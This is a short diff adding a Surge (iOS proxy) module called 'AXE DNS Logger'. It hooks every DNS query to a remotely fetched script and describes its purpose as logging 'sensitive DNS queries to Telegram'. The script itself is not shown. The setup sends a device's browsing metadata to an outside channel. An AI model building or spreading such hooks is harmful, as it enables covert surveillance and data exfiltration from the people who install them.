@@ -1,0 +1,9 @@
+#!name=AXE DNS Logger
+#!desc=Logs sensitive DNS queries to Telegram
+#!system=ios
+#!version=1.0
+#!author=AxeB2B
+#!homepage=https://github.com/APNA_USERNAME/surge-axe
+
+[Script]
+dns-query script-path=https://raw.githubusercontent.com/APNA_USERNAME/surge-axe/main/scripts/dns_logger.js, timeout=10, tag=AXE-DNSLog
